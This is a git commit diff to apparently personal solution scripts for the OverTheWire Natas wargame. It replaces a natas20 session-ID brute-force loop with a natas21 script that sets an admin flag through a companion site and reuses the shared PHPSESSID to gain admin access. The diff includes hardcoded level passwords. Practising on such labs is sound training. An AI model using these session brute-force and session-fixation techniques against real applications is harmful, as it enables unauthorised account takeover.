8b764c0fa8ac5648ab3661539ebf2d18f1f0056d
mauzinho <mauzware@gmail.com>
2025-06-17 00:29:53 +0200

    session-fixation.py

--- Natas/session-fixation.py
+++ Natas/session-fixation.py
@@ -1,22 +1,18 @@
 import requests
-import binascii
 
-auth = ("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw")
-url = "http://natas20.natas.labs.overthewire.org"
+target = "http://natas21-experimenter.natas.labs.overthewire.org"
+auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')
+params = dict(debug='', submit='', admin=1)
+cookies = dict()
 
-# Session IDs are likely hex representations of something like user-id
-# Let's try from 1 to 640, encode as hex
-for i in range(1, 640):
-    sid = binascii.hexlify(f"{i}-admin".encode()).decode()
-    cookies = {"PHPSESSID": sid}
-    
-    r = requests.get(url, auth=auth, cookies=cookies)
+response = requests.get(target, auth=auth, params=params, cookies=cookies)
+phpsessid = response.cookies['PHPSESSID']
+print(response.text)
 
-    if "You are an admin. The credentials for the next level are:" in r.text:
-        print(f"[+] Found admin session: {sid}")
-        print(r.text)
-        break
-    else:
-        print(f"[-] Tried {sid}")
+target = 'http://natas21.natas.labs.overthewire.org'
+params = dict(debug='')
+cookies = dict(PHPSESSID=phpsessid)
+response = requests.get(target, auth=auth, params=params, cookies=cookies)
+print(response.text)
 
 
